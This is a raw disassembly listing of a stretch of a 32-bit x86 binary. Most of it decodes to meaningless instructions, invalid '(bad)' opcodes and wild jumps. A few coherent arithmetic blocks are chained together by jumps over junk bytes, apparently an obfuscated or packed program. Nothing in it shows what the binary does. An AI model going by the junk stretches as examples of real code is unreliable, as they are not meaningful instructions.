  404926:	mov    DWORD PTR [edi+0x5ef72b53],edx
  40492c:	push   ecx
  40492d:	xor    DWORD PTR ds:0x122b2873,ebp
  404933:	pop    edx
  404934:	mov    eax,ds:0xb7af4f0
  404939:	inc    esi
  40493a:	(bad)  [esp+ebp*1-0x5be967b5]
  404941:	push   esp
  404942:	jl     0x4048cd
  404944:	sub    al,0x31
  404946:	xchg   DWORD PTR [edi-0x27],esp
  404949:	loope  0x40490d
  40494b:	mov    edx,0xdd75d47f
  404950:	mov    BYTE PTR [ebx],0xf0
  404953:	(bad)  [ecx-0x6e8e5977]
  404959:	popf   
  40495a:	dec    esi
  40495b:	aad    0xa5
  40495d:	mov    edx,0xc23e2a2c
  404962:	enter  0x35a9,0x53
  404966:	jmp    0x9145e388
  40496b:	dec    edx
  40496c:	add    BYTE PTR [edx+0x3e],bh
  40496f:	cmp    eax,0x3a7aa29f
  404974:	adc    esi,eax
  404976:	ret    0xb31f
  404979:	sti    
  40497a:	sbb    BYTE PTR [edx-0x5577d1a1],ah
  404980:	aaa    
  404981:	mov    esp,esp
  404983:	stos   DWORD PTR es:[edi],eax
  404984:	aam    0x5a
  404986:	data16 in al,dx
  404988:	les    ebp,FWORD PTR [esi-0x39]
  40498b:	mov    ebp,0x5642d2cd
  404990:	retf   
  404991:	(bad)  
  404992:	xchg   edi,eax
  404993:	js     0x404a0a
  404995:	sub    BYTE PTR [edx+ecx*4],0x43
  404999:	arpl   WORD PTR [esp+eiz*2],di
  40499c:	dec    esi
  40499d:	div    BYTE PTR [esi]
  40499f:	pop    edi
  4049a0:	retf   0x6209
  4049a3:	out    0x8b,eax
  4049a5:	push   ecx
  4049a6:	cmp    eax,0x4cdf3c65
  4049ab:	xor    bl,BYTE PTR [eax]
  4049ad:	mov    esi,0x2fab1e28
  4049b2:	std    
  4049b3:	imul   ecx,DWORD PTR [eax-0x71093460],0xdab686b6
  4049bd:	cdq    
  4049be:	pop    esi
  4049bf:	inc    edi
  4049c0:	xor    edx,eax
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [eax-0x6e5d54f9],edi
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a22
  4049e3:	inc    esp
  4049e4:	sub    DWORD PTR [esi],esi
  4049e6:	imul   BYTE PTR [ebx-0x7ea75d72]
  4049ec:	pop    es
  4049ed:	int    0xda
  4049ef:	sbb    DWORD PTR [edi-0x76],esp
  4049f2:	mov    dl,0xb8
  4049f4:	mov    dh,cl
  4049f6:	push   esi
  4049f7:	sbb    DWORD PTR ds:0x718ec888,ecx
  4049fd:	xlat   BYTE PTR ds:[ebx]
  4049fe:	lock std 
  404a00:	push   esi
  404a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a02:	lahf   
  404a03:	sbb    BYTE PTR [esi+0x3032ea95],ah
  404a09:	or     BYTE PTR [ecx],cl
  404a0b:	shl    DWORD PTR [ebp+0x11],0x2d
  404a0f:	sahf   
  404a10:	sbb    edx,DWORD PTR [ebp+0x35]
  404a13:	xchg   dl,dl
  404a15:	inc    ebx
  404a16:	(bad)  
  404a17:	iret   
  404a18:	mov    WORD PTR [esi+0x47],?
  404a1b:	push   ebx
  404a1c:	inc    edi
  404a1d:	or     DWORD PTR [edx+0x6b],0x16
  404a21:	fwait
  404a22:	dec    eax
  404a23:	stc    
  404a24:	sub    esp,ebp
  404a26:	faddp  st(1),st
  404a28:	test   BYTE PTR [edx],dh
  404a2a:	popf   
  404a2b:	(bad)  
  404a2c:	cmp    DWORD PTR [edx-0x7],esp
  404a2f:	mov    edi,0xc70d21a8
  404a34:	repz (bad) 
  404a36:	pop    ss
  404a37:	ja     0x404aa6
  404a39:	jp     0x404a1f
  404a3b:	sbb    ebx,DWORD PTR [edi-0x36]
  404a3e:	test   al,0x93
  404a40:	sub    DWORD PTR [ebx+0x2f879eda],esp
  404a46:	aad    0x9c
  404a48:	outs   dx,DWORD PTR ds:[esi]
  404a49:	xchg   ecx,eax
  404a4a:	clc    
  404a4b:	test   al,0x1f
  404a4d:	popa   
  404a4e:	push   ecx
  404a4f:	mov    ds,edi
  404a51:	sub    BYTE PTR [esi],bh
  404a53:	pushf  
  404a54:	or     dx,WORD PTR ds:0x56146ed2
  404a5b:	lods   al,BYTE PTR ds:[esi]
  404a5c:	mov    dh,0x43
  404a5e:	lods   eax,DWORD PTR ds:[esi]
  404a5f:	and    ah,cl
  404a61:	mov    eax,ds:0x3bd6495d
  404a66:	add    DWORD PTR [ebx],esi
  404a68:	jae    0x404a49
  404a6a:	mov    dl,0x3e
  404a6c:	inc    ebx
  404a6d:	cmp    eax,DWORD PTR [eax]
  404a6f:	neg    DWORD PTR [esi-0x291453bc]
  404a75:	arpl   WORD PTR [ebp+0x4c],bx
  404a78:	push   ebx
  404a79:	jno    0x404acc
  404a7b:	ja     0x404a78
  404a7d:	sub    al,0xa7
  404a7f:	cmp    esi,edx
  404a81:	int    0xca
  404a83:	sub    dh,dl
  404a85:	xchg   edi,eax
  404a86:	sbb    eax,0xc178881c
  404a8b:	jp     0x404a2c
  404a8d:	or     BYTE PTR [ecx-0x9],bl
  404a90:	mov    cl,0x0
  404a92:	call   edi
  404a94:	out    0x3,al
  404a96:	arpl   WORD PTR [edx],sp
  404a98:	mov    ds:0xef3403b,eax
  404a9d:	ror    BYTE PTR [esi+0x307df25],cl
  404aa3:	inc    esi
  404aa4:	adc    BYTE PTR [edi-0x41202c17],dl
  404aaa:	and    BYTE PTR ds:0xd1315962,0x41
  404ab1:	and    esp,edx
  404ab3:	jle    0x404a9a
  404ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab6:	stos   DWORD PTR es:[edi],eax
  404ab7:	or     ebp,edx
  404ab9:	sbb    dh,BYTE PTR [esi-0x58]
  404abc:	fstp   st(2)
  404abe:	pop    ebp
  404abf:	jmp    0xc253e9f5
  404ac4:	jmp    0x5ff9192d
  404ac9:	jnp    0x404a83
  404acb:	pop    es
  404acc:	pop    esp
  404acd:	out    0x47,eax
  404acf:	sbb    al,0xad
  404ad1:	loopne 0x404a55
  404ad3:	fs cmp esi,edi
  404ad6:	fs fdiv st(5),st
  404ad9:	sbb    BYTE PTR [edx+0x4b0f43be],ch
  404adf:	(bad)  
  404ae0:	dec    edx
  404ae1:	xchg   esi,eax
  404ae2:	dec    edi
  404ae3:	sub    ch,BYTE PTR [ecx]
  404ae5:	ss sbb eax,0xca51f450
  404aeb:	mov    al,ds:0x57fdac93
  404af0:	pop    esi
  404af1:	retf   0x7529
  404af4:	sbb    al,0xb1
  404af6:	dec    eax
  404af7:	dec    ecx
  404af8:	and    ch,bl
  404afa:	loopne 0x404b13
  404afc:	jl     0x404b79
  404afe:	pushf  
  404aff:	push   0x2e4b7997
  404b04:	inc    ebx
  404b05:	dec    ebp
  404b06:	adc    bh,BYTE PTR [esi-0x7a3e963]
  404b0c:	jae    0x404b8b
  404b0e:	mov    ebp,0xeaa8eb60
  404b13:	leave  
  404b14:	xor    eax,0x23b0d831
  404b19:	call   0xd3a4954d
  404b1e:	cwde   
  404b1f:	cld    
  404b20:	sub    ecx,DWORD PTR [eax]
  404b22:	fistp  DWORD PTR [ebp-0x25]
  404b25:	inc    ecx
  404b26:	ds jne 0x404b63
  404b29:	ret    
  404b2a:	in     al,0x78
  404b2c:	ja     0x404b09
  404b2e:	test   eax,0x30fa2dc1
  404b33:	mov    ds:0x7d4c1231,al
  404b38:	jp     0x404b58
  404b3a:	xlat   BYTE PTR ds:[ebx]
  404b3b:	sub    eax,0xf3ba3f5d
  404b40:	cmp    al,0xfd
  404b42:	sub    al,0xab
  404b44:	inc    esi
  404b45:	add    ah,dh
  404b47:	sbb    cl,ch
  404b49:	fadd   st,st(5)
  404b4b:	sub    DWORD PTR [esi-0x3106aed2],ecx
  404b51:	push   esi
  404b52:	inc    ecx
  404b53:	mov    BYTE PTR [ecx],ch
  404b55:	xchg   esp,eax
  404b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b57:	call   0xd4f413b0
  404b5c:	push   edi
  404b5d:	mov    ah,0x98
  404b5f:	or     al,BYTE PTR [ecx+0x28]
  404b62:	hlt    
  404b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b64:	test   eax,0xe0f25ff5
  404b69:	mov    cs,WORD PTR [ecx-0x2828c9e1]
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	jecxz  0x404bb2
  404b9a:	out    0xcd,al
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b7c
  404ba5:	stos   BYTE PTR es:[edi],al
  404ba6:	mov    ss:0xa594a4c7,eax
  404bac:	mov    dh,0x90
  404bae:	cs jp  0x404c2a
  404bb1:	stc    
  404bb2:	stos   DWORD PTR es:[edi],eax
  404bb3:	xchg   DWORD PTR [ebx+0x36],ebp
  404bb6:	ss dec ebp
  404bb8:	sbb    esp,DWORD PTR [eax+0x67]
  404bbb:	xlat   BYTE PTR ds:[ebx]
  404bbc:	div    DWORD PTR [edx]
  404bbe:	pop    ebx
  404bbf:	or     eax,0x38584174
  404bc4:	xor    BYTE PTR [ecx+0x30],bh
  404bc7:	push   0x20
  404bc9:	xchg   edx,eax
  404bca:	cmp    al,0x9b
  404bcc:	cmp    ch,bh
  404bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcf:	push   eax
  404bd0:	push   ss
  404bd1:	loopne 0x404b5e
  404bd3:	fstp   DWORD PTR ds:0xdd61844c
  404bd9:	add    esi,DWORD PTR [esi+0x4654ae0d]
  404bdf:	mov    dl,0xdf
  404be1:	and    ah,BYTE PTR [edi+0x4a]
  404be4:	xchg   esi,eax
  404be5:	dec    DWORD PTR [ebx]
  404be7:	push   0x7a
  404be9:	cs rol dl,1
  404bec:	pop    ss
  404bed:	inc    ecx
  404bee:	dec    ebp
  404bef:	into   
  404bf0:	pop    ecx
  404bf1:	cmp    al,0x98
  404bf3:	xchg   ecx,eax
  404bf4:	repnz cmp esi,DWORD PTR [edx+0x329c093e]
  404bfb:	pop    edi
  404bfc:	test   al,0x74
  404bfe:	xlat   BYTE PTR ds:[ebx]
  404bff:	add    al,0x1d
  404c01:	std    
  404c02:	or     esp,esp
  404c04:	loop   0x404c48
  404c06:	adc    dl,BYTE PTR [ecx-0x3]
  404c09:	dec    edx
  404c0a:	push   eax
  404c0b:	and    cl,BYTE PTR [esi+0x29]
  404c0e:	inc    edx
  404c0f:	icebp  
  404c10:	xor    DWORD PTR [ebp-0x5f577113],edx
  404c16:	mov    eax,ds:0x80e96630
  404c1b:	in     eax,dx
  404c1c:	(bad)  
  404c1d:	mov    edi,0xe32a17dc
  404c22:	shl    edi,cl
  404c24:	and    DWORD PTR [ebp+ecx*1-0x18b0d705],ecx
  404c2b:	rol    BYTE PTR [esi-0x6c78dcaa],cl
  404c31:	push   edi
  404c32:	outs   dx,BYTE PTR ds:[esi]
  404c33:	inc    edi
  404c34:	pop    eax
  404c35:	out    0x9b,eax
  404c37:	aad    0x99
  404c39:	call   0x6e14:0xfa589fbd
  404c40:	jp     0x404cb2
  404c42:	outs   dx,DWORD PTR ds:[esi]
  404c43:	clc    
  404c44:	xchg   DWORD PTR [edi+ecx*4+0x33],eax
  404c48:	inc    eax
  404c49:	adc    BYTE PTR [ecx-0x11bda9ec],0x65
  404c50:	call   0x23047457
  404c55:	stc    
  404c56:	dec    esi
  404c57:	dec    edx
  404c58:	xlat   BYTE PTR ds:[ebx]
  404c59:	pop    ebx
  404c5a:	cmc    
  404c5b:	xchg   ebp,eax
  404c5c:	and    ebp,ebp
  404c5e:	aad    0xc2
  404c60:	dec    edx
  404c61:	test   BYTE PTR [edx],al
  404c63:	inc    ecx
  404c64:	mov    eax,ds:0x61619a6f
  404c69:	add    BYTE PTR [ebp+0x19],ah
  404c6c:	test   eax,0x80315f1b
  404c71:	or     ah,dl
  404c73:	xchg   edx,eax
  404c74:	stos   DWORD PTR es:[edi],eax
  404c75:	push   0xf8b6f945
  404c7a:	mov    BYTE PTR [ecx+0x48c77f82],bl
  404c80:	mov    dl,0xec
  404c82:	fisub  DWORD PTR [esi-0x775f6f8e]
  404c88:	stos   BYTE PTR es:[edi],al
  404c89:	sbb    DWORD PTR [esi],0x46
  404c8c:	dec    edx
  404c8d:	mov    ch,0xc8
  404c8f:	adc    DWORD PTR [edi],esi
  404c91:	lahf   
  404c92:	push   ss
  404c93:	popf   
  404c94:	xor    eax,0xe993a5e6
  404c99:	adc    DWORD PTR [edx-0x5e],esi
  404c9c:	das    
  404c9d:	pop    es
  404c9e:	dec    edi
  404c9f:	xchg   ecx,eax
  404ca0:	xor    eax,0xfca3a894
  404ca5:	sub    edx,0x8421102c
  404cab:	pop    eax
  404cac:	imul   esi,DWORD PTR [ecx+ebx*8-0x37],0xffffffcf
  404cb1:	gs std 
  404cb3:	dec    esp
  404cb4:	mov    eax,DWORD PTR [esi]
  404cb6:	xchg   esp,eax
  404cb7:	and    eax,0x96d907e9
  404cbc:	sub    al,0x82
  404cbe:	enter  0xb092,0x80
  404cc2:	ja     0x404d2e
  404cc4:	adc    eax,0x5aba30d6
  404cc9:	sti    
  404cca:	and    DWORD PTR [ebx],eax
  404ccc:	add    bl,dh
  404cce:	pop    esi
  404ccf:	in     al,0x24
  404cd1:	mov    BYTE PTR [esi+0x748e9d13],dl
  404cd7:	mov    ecx,0x705765c3
  404cdc:	xchg   BYTE PTR [edx],bl
  404cde:	inc    esp
  404cdf:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  404ce1:	inc    ebx
  404ce2:	push   0xffffff83
  404ce4:	bnd jne 0x404d36
  404ce7:	test   bl,bl
  404ce9:	xor    BYTE PTR gs:[esi],ah
  404cec:	out    0xa0,eax
  404cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cef:	or     ebx,edx
  404cf1:	sub    DWORD PTR [eax],edx
  404cf3:	hlt    
  404cf4:	and    DWORD PTR [esi],ebp
  404cf6:	jnp    0x404cdc
  404cf8:	call   0x5c53:0xb481137
  404cff:	loop   0x404cad
  404d01:	inc    esi
  404d02:	cmp    al,0x4f
  404d04:	in     eax,dx
  404d05:	(bad)  
  404d06:	jne    0x404cbf
  404d08:	xor    BYTE PTR [edi+edi*4+0x2c010ed9],bl
  404d0f:	sar    DWORD PTR [esi],1
  404d11:	dec    ebp
  404d12:	push   cs
  404d13:	stos   DWORD PTR es:[edi],eax
  404d14:	data16 repz (bad) 
  404d17:	(bad)  
  404d19:	mov    esi,0x540253b8
  404d1e:	dec    ebp
  404d1f:	mov    bl,0x10
  404d21:	mov    dh,0xe9
  404d23:	inc    esi
  404d24:	outs   dx,BYTE PTR ds:[esi]
  404d25:	sub    edx,ebp
  404d27:	push   ecx
  404d28:	pop    eax
  404d29:	xor    ch,BYTE PTR [edi+0x2583d78e]
  404d2f:	inc    ebx
  404d30:	mov    ds:0x88e45d8b,al
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [ebx+0x47],cl
  404d94:	sbb    DWORD PTR [esi+0x7e7e2fbb],esi
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404dae
  404d9f:	and    ebx,DWORD PTR [edx+0x22]
  404da2:	mov    esp,0x5de834b3
  404da7:	jecxz  0x404d34
  404da9:	(bad)  
  404daa:	adc    bl,BYTE PTR [esi+0x213cb0c7]
  404db0:	or     DWORD PTR [edi+0x17],eax
  404db3:	mov    dl,0x2
  404db5:	jnp    0x404de9
  404db7:	push   ecx
  404db8:	mul    ebx
  404dba:	imul   esp,DWORD PTR [edx-0x16ecd8e0],0xff7158d
  404dc4:	xchg   esi,eax
  404dc5:	inc    esi
  404dc6:	jl     0x404d4b
  404dc8:	outs   dx,DWORD PTR ds:[esi]
  404dc9:	cmp    BYTE PTR [ecx+0x9],dh
  404dcc:	(bad)  [eax-0x6356e8bd]
  404dd2:	mov    ds:0x9a5b0b73,eax
  404dd7:	fld    TBYTE PTR [edi+esi*2+0x64bab2aa]
  404dde:	push   es
  404ddf:	and    eax,0x694e8000
  404de4:	(bad)  
  404de5:	(bad)  
  404de6:	lds    ebx,FWORD PTR [eax+0x5d7c90f6]
  404dec:	mov    ds:0xbc28d105,al
  404df1:	or     al,0xdc
  404df3:	mov    ds:0xe85907d,al
  404df8:	ins    BYTE PTR es:[edi],dx
  404df9:	xor    esi,DWORD PTR [ebx]
  404dfb:	mov    BYTE PTR [edi],bl
  404dfd:	inc    edi
  404dfe:	stc    
  404dff:	mov    edi,0xc0aa14ea
  404e04:	in     al,dx
  404e05:	aaa    
  404e06:	jbe    0x404ddf
  404e08:	jecxz  0x404dc1
  404e0a:	int3   
  404e0b:	adc    al,0x34
  404e0d:	push   ecx
  404e0e:	adc    al,0x7d
  404e10:	je     0x404e4c
  404e12:	cdq    
  404e13:	sbb    al,0x6b
  404e15:	aam    0x90
  404e17:	sub    BYTE PTR [edx+ebp*1],ch
  404e1a:	outs   dx,DWORD PTR ds:[esi]
  404e1b:	or     al,0x5d
  404e1d:	xchg   edi,ecx
  404e1f:	mov    dl,0xee
  404e21:	inc    esi
  404e22:	loop   0x404db9
  404e24:	inc    edx
  404e25:	sub    eax,0xf9c210f1
  404e2a:	jno    0x404e8d
  404e2c:	popf   
  404e2d:	or     cl,ah
  404e2f:	sbb    ebp,ebx
  404e31:	cmc    
  404e32:	xchg   ebx,eax
  404e33:	sub    esp,ecx
  404e35:	das    
  404e36:	xchg   BYTE PTR [eax-0x7c],dl
  404e39:	adc    al,0x8b
  404e3c:	push   0xfffffffa
  404e3e:	js     0x404e47
  404e40:	ja     0x404ec1
  404e42:	(bad)  
  404e44:	jle    0x404e10
  404e46:	mov    WORD PTR [edx-0x20141c87],es
  404e4c:	jg     0x404eab
  404e4e:	adc    DWORD PTR [edx],esi
  404e50:	sbb    al,BYTE PTR [ebp-0x16586c6d]
  404e56:	nop
  404e57:	push   ecx
  404e58:	add    edx,DWORD PTR [esi]
  404e5a:	inc    ebx
  404e5b:	in     eax,dx
  404e5c:	fld    QWORD PTR [ebx-0x80]
  404e5f:	mov    ch,0x60
  404e61:	shl    DWORD PTR [ebx+0x31bcb48e],0xbe
  404e68:	nop
  404e69:	sub    ecx,edi
  404e6b:	push   ebp
  404e6c:	xor    al,0x9b
  404e6e:	out    dx,eax
  404e6f:	pusha  
  404e70:	cmp    edi,DWORD PTR [ebp+0x5c243735]
  404e76:	ret    
  404e77:	and    esi,DWORD PTR [edx+0x2c]
  404e7a:	xchg   BYTE PTR [ebx],dl
  404e7c:	nop
  404e7d:	(bad)  
  404e7f:	adc    al,0x2
  404e81:	xlat   BYTE PTR ds:[ebx]
  404e82:	gs loopne 0x404e14
  404e85:	push   edi
  404e86:	mov    al,0x2a
  404e88:	sub    al,0x7b
  404e8a:	jbe    0x404e6a
  404e8c:	mov    eax,ds:0x3fb434b6
  404e92:	sahf   
  404e93:	add    al,0xdd
  404e95:	jns    0x404ef0
  404e97:	stos   DWORD PTR es:[edi],eax
  404e98:	jno    0x404e41
  404e9a:	add    eax,0xea7be8b2
  404e9f:	cmp    DWORD PTR [ebx],ebx
  404ea1:	mov    ebp,0xf1448b04
  404ea6:	ss (bad) 
  404ea8:	adc    edi,esp
  404eaa:	and    eax,0x4eb2ceb5
  404eaf:	(bad)  
  404eb1:	and    al,BYTE PTR [esi+0xf]
  404eb4:	fwait
  404eb5:	cli    
  404eb6:	jo     0x404ece
  404eb8:	fwait
  404eb9:	lods   eax,DWORD PTR ds:[esi]
  404eba:	lock pop esi
  404ebc:	add    BYTE PTR [edi],ah
  404ebe:	outs   dx,BYTE PTR ds:[esi]
  404ebf:	adc    DWORD PTR [ecx],esi
  404ec1:	push   esp
  404ec2:	nop
  404ec3:	sahf   
  404ec4:	adc    ch,BYTE PTR [edx]
  404ec6:	sub    DWORD PTR [edi+0x63939fb7],ebp
  404ecc:	and    DWORD PTR [ebx+0x37],edx
  404ecf:	jl     0x404ea6
  404ed1:	mov    esp,0x41ed548
  404ed6:	xchg   BYTE PTR [ebp-0x3d9889b7],ch
  404edc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404ede:	test   esp,esp
  404ee0:	sbb    eax,0x9424f1
  404ee5:	and    al,0xea
  404ee7:	rol    DWORD PTR [ebx+0x34ffe02a],0x5
  404eee:	outs   dx,BYTE PTR ds:[esi]
  404eef:	and    ch,BYTE PTR [esp+ebp*2+0x1341b19d]
  404ef6:	xor    esp,0x495e1709
  404efc:	pop    ebx
  404efd:	xchg   BYTE PTR [ebp+0x45],al
  404f00:	mov    eax,0x4dad7988
  404f05:	inc    ebx
  404f06:	pop    esi
  404f07:	add    edx,ecx
  404f09:	jns    0x404f38
  404f0b:	enter  0xcb5c,0x1
  404f0f:	push   esi
  404f10:	add    ecx,DWORD PTR [esi-0x63e57907]
  404f16:	imul   eax,DWORD PTR [eax],0xdf4b213e
  404f1c:	cdq    
  404f1d:	adc    BYTE PTR [esi+0x5d],dh
  404f20:	pushf  
  404f21:	dec    eax
  404f22:	jno    0x404f7e
  404f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f25:	sahf   
  404f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f27:	aaa    
  404f28:	hlt    
  404f29:	mov    ebp,?
  404f2b:	xor    edi,eax
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x8dd15a29
  404f44:	popf   
  404f45:	in     eax,dx
  404f46:	cli    
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f52
  404f50:	push   ebx
  404f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f52:	adc    ebx,ebp
  404f54:	mov    esi,0xcfd0af92
  404f59:	jle    0x404fd2
  404f5b:	or     al,BYTE PTR [edi]
  404f5d:	sar    BYTE PTR [edi-0x22],0xc
  404f61:	dec    ebx
  404f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f63:	cmp    eax,0x638a3b99
  404f68:	ret    
  404f69:	gs out dx,eax
  404f6b:	sbb    eax,0xb9083ef7
  404f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f71:	add    al,0x7b
  404f73:	or     bl,BYTE PTR [ecx+0x30]
  404f76:	xchg   ebp,eax
  404f77:	inc    edx
  404f78:	sar    DWORD PTR [ebx+0x2b02f4ce],0x12
  404f7f:	mov    edx,0x3c0b1d46
  404f84:	fwait
  404f85:	pop    eax
  404f86:	push   edi
  404f87:	fisub  WORD PTR cs:[edi-0x1731fc50]
  404f8e:	out    dx,al
  404f8f:	push   esp
  404f90:	cmp    eax,0xe222435f
  404f95:	dec    eax
  404f96:	ss ret 0xcec8
  404f9a:	das    
  404f9b:	adc    DWORD PTR [ebx+edx*8],ebx
  404f9e:	mov    al,ds:0x3a03d23b
  404fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa5:	xchg   ecx,eax
  404fa6:	jbe    0x405021
  404fa8:	es scas al,BYTE PTR es:[edi]
  404faa:	outs   dx,BYTE PTR ds:[esi]
  404fab:	xchg   ebp,eax
  404fac:	ins    BYTE PTR es:[edi],dx
  404fad:	mov    cl,0xec
  404faf:	sbb    DWORD PTR [ecx],edx
  404fb1:	nop
  404fb2:	xor    bh,BYTE PTR [eax+0x3734d80a]
  404fb8:	mov    ah,0x59
  404fba:	xchg   esi,eax
  404fbb:	je     0x404fb7
  404fbd:	imul   BYTE PTR [eax-0x407487b8]
  404fc3:	xchg   esi,eax
  404fc4:	xor    DWORD PTR [esi+0x6bb541cd],esp
  404fca:	and    edx,DWORD PTR [ebx-0x74ed0eec]
  404fd0:	ins    BYTE PTR es:[edi],dx
  404fd1:	nop
  404fd2:	push   edx
  404fd3:	out    dx,al
  404fd4:	iret   
  404fd5:	push   0x20
  404fd7:	cmc    
  404fd8:	mov    ds:0x53fa7b23,eax
  404fdd:	sbb    DWORD PTR [eax],esi
  404fdf:	dec    edi
  404fe0:	jecxz  0x405023
  404fe2:	pusha  
  404fe3:	mov    cl,0xca
  404fe5:	xor    bh,ch
  404fe7:	push   esi
  404fe8:	(bad)  
  404fe9:	mov    eax,ds:0xcc46dd1a
  404fee:	xor    eax,0xb4177a47
  404ff3:	xchg   ecx,eax
  404ff4:	outs   dx,DWORD PTR ds:[esi]
  404ff5:	sbb    BYTE PTR [ecx],bh
  404ff7:	sbb    edi,DWORD PTR [ecx+0x2c]
  404ffa:	test   al,0x50
  404ffc:	rcl    DWORD PTR [ebx-0x2f],0xcf
  405000:	jns    0x405014
  405002:	rcl    DWORD PTR [ebx],1
  405004:	ds cmp eax,0x72bcd93f
  40500a:	frstor [ebx]
  40500c:	cli    
  40500d:	push   ebp
  40500e:	bound  ebx,QWORD PTR ss:[ebx+edx*2-0x74f3f30a]
  405016:	fisub  DWORD PTR ss:[eax-0x2091b1cf]
  40501d:	push   edx
  40501e:	daa    
  40501f:	repnz mul esp
  405022:	and    esi,0xa96109c7
  405028:	loope  0x404fae
  40502a:	cld    
  40502b:	sub    DWORD PTR [esi+0x60],edi
  40502e:	adc    al,0x3b
  405030:	push   ds
  405031:	scas   eax,DWORD PTR es:[edi]
  405032:	addr16 in al,dx
  405034:	sbb    DWORD PTR [ecx-0x2d],edi
  405037:	daa    
  405038:	mov    ebp,0xe0beb109
  40503d:	and    ch,BYTE PTR [esi+0x76cc72db]
  405043:	in     eax,0x2b
  405045:	call   0xe82c:0x7bdfa738
  40504c:	mov    dh,0x6e
  40504e:	mov    al,ds:0x231189a7
  405053:	bound  edx,QWORD PTR [ecx+0x68]
  405056:	cmp    DWORD PTR [ebx+0x7e01ecfe],esp
  40505c:	push   0xffffff8b
  40505e:	retf   
  40505f:	jp     0x404ff9
  405061:	adc    eax,0x61d7a0ff
  405066:	leave  
  405067:	loopne 0x405067
  405069:	or     al,0xb0
  40506b:	inc    eax
  40506c:	test   al,0x8
  40506e:	out    0x80,al
  405070:	inc    edi
  405071:	mov    dl,0x96
  405073:	mov    ah,0xa2
  405075:	sub    ecx,DWORD PTR [esi-0x5ed11699]
  40507b:	dec    ebp
  40507c:	sbb    ebp,esp
  40507e:	fdiv   DWORD PTR [edx+edi*2-0x1f71a50f]
  405085:	xchg   BYTE PTR [ebp+0x277579b5],dh
  40508b:	xor    ah,BYTE PTR [ecx-0x43f0b80c]
  405091:	add    eax,eax
  405093:	fsubr  QWORD PTR [ecx-0x688d2f5d]
  405099:	leave  
  40509a:	(bad)  
  40509b:	jnp    0x40503f
  40509d:	pop    ebp
  40509e:	jle    0x405072
  4050a0:	cmp    esi,DWORD PTR [ecx]
  4050a2:	shl    DWORD PTR [eax-0x3f],cl
  4050a5:	mov    ?,ebp
  4050a7:	pop    esp
  4050a8:	data16 adc BYTE PTR [ecx+0xe7a148c],dh
  4050af:	into   
  4050b0:	(bad)  
  4050b1:	inc    bh
  4050b3:	and    BYTE PTR [ebp+eax*4-0x3a],ch
  4050b7:	xchg   edx,eax
  4050b8:	xor    ch,BYTE PTR [eax+0x2496d6b9]
  4050be:	mov    bl,0x13
  4050c0:	scas   al,BYTE PTR es:[edi]
  4050c1:	xchg   BYTE PTR [ebp+0x3a4d6cd],cl
